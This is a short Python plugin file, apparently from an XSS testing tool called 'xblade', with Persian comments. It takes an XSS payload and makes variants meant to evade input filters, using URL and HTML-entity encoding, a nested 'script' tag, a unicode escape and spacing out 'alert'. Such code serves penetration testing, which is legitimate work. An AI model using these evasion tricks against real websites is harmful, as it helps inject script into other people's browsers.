# xblade/plugins/bypass_filters.py

def apply_bypass_plugins(payload):
    """اعمال تکنیک‌های ساده بای‌پس روی یک payload XSS."""
    bypassed = []

    # استفاده از کدگذاری‌های متفاوت
    bypassed.append(payload.replace("<", "%3C").replace(">", "%3E"))
    bypassed.append(payload.replace("<", "&lt;").replace(">", "&gt;"))
    
    # شکستن تگ‌های مشکوک برای دور زدن فیلتر
    bypassed.append(payload.replace("script", "scr<script>ipt</script>"))
    bypassed.append(payload.replace("script", "scr\\u0069pt"))

    # درج فضای خالی بین کاراکترها
    bypassed.append(payload.replace("alert", "a l e r t"))

    return list(set(bypassed))  # حذف موارد تکراری
